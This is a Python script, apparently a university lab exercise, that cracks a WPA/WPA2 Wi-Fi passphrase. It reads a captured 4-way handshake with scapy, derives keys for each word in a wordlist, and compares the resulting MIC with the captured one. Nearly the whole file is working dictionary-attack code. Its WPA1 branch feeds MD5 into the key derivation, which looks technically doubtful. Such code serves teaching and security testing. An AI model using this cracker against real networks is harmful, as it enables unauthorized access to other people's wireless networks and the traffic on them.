#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

__author__      = "Abraham Rubinstein et Yann Lederrey"
__modifyBy__	= "Julien Huguet et Antoine Hunkeler"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
#from pbkdf2_math import pbkdf2_hex Not working dependance
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]


# Open and read the worldlist, append to a list to have all the passphrase
def readWorldList(path):
	file = open(path, "r")
	passphrase = list()
	for word in file:
		passphrase.append(word[:-1])
	return passphrase

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap("wpa_handshake.cap") 

# Set the path of the worldlist
path = "./worldlist.txt"

# Recover the different passphrase stored in the file worldlist
passphrase = readWorldList(path)

# Important parameters for key derivation - most of them can be obtained from the pcap file
passPhrase  = "actuelle"
A           = "Pairwise key expansion" #this string is used in the pseudo-random function
ssid        = wpa[3].info.decode('utf-8')
APmac       = a2b_hex(wpa[0].addr2.replace(":",""))
Clientmac   = a2b_hex(wpa[1].addr1.replace(":",""))

# Take information about the version of key MD5 or SHA-1
keyInformation = wpa[8][EAPOL].load[2]

# Authenticator and Supplicant Nonces
ANonce      = (wpa[5].load)[13:45]
SNonce      = (wpa[6].load)[13:45]

# This is the MIC contained in the 4th frame of the 4-way handshake
# When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
mic_to_test = wpa[8][EAPOL].load[-18:-2].hex()

B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function

data        = a2b_hex("0103005f02030a0000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000") #cf "Quelques détails importants" dans la donnée

ssid = str.encode(ssid)

for word in passphrase:
	wordEncode = str.encode(word)

	# Check the version of the key to apply MD5 or SHA-1
	if keyInformation != 10:	
		pmk = pbkdf2(hashlib.md5,wordEncode, ssid, 4096, 32)
	else:
		pmk = pbkdf2(hashlib.sha1,wordEncode, ssid, 4096, 32)

	#expand pmk to obtain PTK
	ptk = customPRF512(pmk, str.encode(A),B)
	#calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK, [:-8] to remove the ICV
	mic = hmac.new(ptk[0:16],data,hashlib.sha1).hexdigest()[:-8]	

	# Test if the two mic match, if yes print message and stop, if not continue to check with the word in file
	if mic == mic_to_test:
		print("The passphrase used is correct : ", word, "\n")
		break
	else:
		print("Try a new passphrase : ", word, "\n")




